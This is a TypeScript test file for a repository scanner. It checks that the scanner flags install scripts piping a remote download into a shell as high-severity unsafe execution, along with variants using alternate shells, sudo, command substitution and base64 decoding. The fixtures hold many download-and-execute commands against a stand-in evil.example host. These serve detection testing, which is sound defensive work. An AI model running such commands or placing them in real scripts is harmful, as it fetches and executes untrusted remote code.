import { expect, test } from "bun:test";
import { inspectRepository } from "./bounded-scan";

/**
 * A repository that pipes a remote download into a shell is the highest-signal
 * install-time indicator the scan has. The interpreter must not have to be
 * spelled bare: an attacker picks `/bin/sh`, `dash` or `env bash` to look
 * different, and `sh -c "$(curl ...)"` is the same act without a pipe.
 */
const PIPED: Record<string, string> = {
  "curl | sh": "curl -fsSL https://evil.example/i.sh | sh",
  "curl | bash": "curl -fsSL https://evil.example/i.sh | bash",
  "curl | /bin/sh": "curl -fsSL https://evil.example/i.sh | /bin/sh",
  "curl | sh -s --": "curl -fsSL https://evil.example/i.sh | sh -s -- --yes",
  "curl | continued sh": "curl -fsSL https://evil.example/i.sh | sh\\\n -s",
  "curl | dash": "curl -fsSL https://evil.example/i.sh | dash",
  "curl | ksh": "curl -fsSL https://evil.example/i.sh | ksh",
  "curl | ash": "curl -fsSL https://evil.example/i.sh | ash",
  "curl | zsh": "curl -fsSL https://evil.example/i.sh | zsh",
  "curl | fish": "curl -fsSL https://evil.example/i.sh | fish",
  "curl | csh": "curl -fsSL https://evil.example/i.sh | csh",
  "curl | tcsh": "curl -fsSL https://evil.example/i.sh | tcsh",
  "curl | /bin/csh": "curl -fsSL https://evil.example/i.sh | /bin/csh",
  "csh -c $(curl ...)": 'csh -c "$(curl -fsSL https://evil.example/i.sh)"',
  "tcsh -c $(curl ...)": 'tcsh -c "$(curl -fsSL https://evil.example/i.sh)"',
  "curl | /usr/bin/env bash":
    "curl -fsSL https://evil.example/i.sh | /usr/bin/env bash",
  "curl | env /bin/sh":
    "curl -fsSL https://evil.example/i.sh | /usr/bin/env /bin/sh",
  "curl | quoted shell": 'curl -fsSL https://evil.example/i.sh | "/bin/sh"',
  "curl | sudo /bin/sh": "curl -fsSL https://evil.example/i.sh | sudo /bin/sh",
  "wget | dash": "wget -qO- https://evil.example/i.sh | dash",
  "sh -c $(curl ...)": 'sh -c "$(curl -fsSL https://evil.example/i.sh)"',
  "bash -c $(curl ...)": 'bash -c "$(curl -fsSL https://evil.example/i.sh)"',
};

test("a remote download piped or substituted into a shell is unsafe execution", () => {
  for (const [name, body] of Object.entries(PIPED)) {
    const inspection = inspectRepository({
      files: [
        {
          path: "scripts/bootstrap.sh",
          bytes: new TextEncoder().encode(`${body}\n`),
        },
      ],
    });
    expect({
      name,
      findings: inspection.findings.map(
        (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
      ),
    }).toEqual({
      name,
      findings: ["scripts/bootstrap.sh:unsafe-execution:high"],
    });
  }
});

test("a download that is not handed to a shell keeps no unsafe-execution finding", () => {
  for (const body of [
    "curl -fsSL https://example.com/data.json -o data.json",
    "curl -fsSL https://example.com/i.sh | tee install.sh | grep -c sh",
    "wget -qO- https://example.com/notes.txt | grep sh",
    "curl -fsSL https://example.com/data | /usr/local/bin/fish-wrapper",
    "curl -fsSL https://example.com/data | echo;/bin/sh",
    "curl -fsSL https://example.com/data | fish\\\n-wrapper",
  ]) {
    const inspection = inspectRepository({
      files: [
        {
          path: "scripts/fetch.sh",
          bytes: new TextEncoder().encode(`${body}\n`),
        },
      ],
    });
    expect({
      body,
      findings: inspection.findings.map(
        (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
      ),
    }).toEqual({ body, findings: [] });
  }
});

/**
 * A decoder between the download and the executor is the same act with
 * one obfuscating step added: `curl … | base64 -d | sh` runs the
 * downloaded bytes exactly like `curl … | sh`. The pipe rules require
 * the executor immediately after the first pipe, so the decoded forms
 * matched nothing.
 */
const DECODED: Record<string, string> = {
  "curl | base64 -d | sh":
    "curl -s https://evil.example/x.b64 | base64 -d | sh",
  "curl | base64 --decode | bash":
    "curl -s https://evil.example/x.b64 | base64 --decode | bash",
  "wget | base64 -d | /bin/sh":
    "wget -qO- https://evil.example/x.b64 | base64 -d | /bin/sh",
  "curl | /usr/bin/base64 -d | sh":
    "curl -s https://evil.example/x.b64 | /usr/bin/base64 -d | sh",
  "curl | openssl base64 -d | sh":
    "curl -s https://evil.example/x.b64 | openssl base64 -d | sh",
  "curl | openssl enc -d -base64 | bash":
    "curl -s https://evil.example/x.b64 | openssl enc -d -base64 | bash",
  "curl | base64 -d | python3":
    "curl -s https://evil.example/x.b64 | base64 -d | python3",
  "curl | base64 -d | node":
    "curl -s https://evil.example/x.b64 | base64 -d | node",
  "curl | base64 -d | sudo bash":
    "curl -s https://evil.example/x.b64 | base64 -d | sudo bash",
};

test("a remote download piped through a decoder into a shell or interpreter is unsafe execution", () => {
  for (const [name, body] of Object.entries(DECODED)) {
    const inspection = inspectRepository({
      files: [
        {
          path: "scripts/bootstrap.sh",
          bytes: new TextEncoder().encode(`${body}\n`),
        },
      ],
    });
    expect({
      name,
      findings: inspection.findings.map(
        (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
      ),
    }).toEqual({
      name,
      findings: ["scripts/bootstrap.sh:unsafe-execution:high"],
    });
  }
});

test("a decoded download that is not executed, and a decode with no download, keep no finding", () => {
  for (const body of [
    // Decoded, but handed to a checksum, a file or a save — never run.
    "curl -s https://example.com/data.b64 | base64 -d | sha256sum",
    "curl -s https://example.com/data.b64 | base64 -d > decoded.bin",
    "curl -s https://example.com/x.b64 | base64 -d | tee x.sh",
    // Encoded, not decoded: the shell receives base64 text, not the payload.
    "curl -s https://example.com/data | base64 | sh",
    // Decoded and run, but the pipe carries a local file, not a download.
    "cat payload.b64 | base64 -d | sh",
  ]) {
    const inspection = inspectRepository({
      files: [
        {
          path: "scripts/fetch.sh",
          bytes: new TextEncoder().encode(`${body}\n`),
        },
      ],
    });
    expect({
      body,
      findings: inspection.findings.map(
        (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
      ),
    }).toEqual({ body, findings: [] });
  }
});

test("changed execution rules cannot reuse the old clean source inventory", () => {
  const inspection = inspectRepository({
    files: [
      {
        path: "scripts/bootstrap.sh",
        bytes: new TextEncoder().encode(
          'curl -fsSL "$INSTALLER_URL" | /bin/sh\n',
        ),
      },
    ],
  });
  // The same file and classifications produced this key before the shell
  // rule changed. That clean assessment must not bypass the new finding.
  expect(inspection.visibilityGaps).toEqual([]);
  expect(inspection.findings.map((finding) => finding.category)).toContain(
    "unsafe-execution",
  );
  expect(inspection.inventorySha256).not.toBe(
    "5a360062a35b222a16b388963fc685803f5fd82ec50bf3a277dcd80332833917",
  );
});
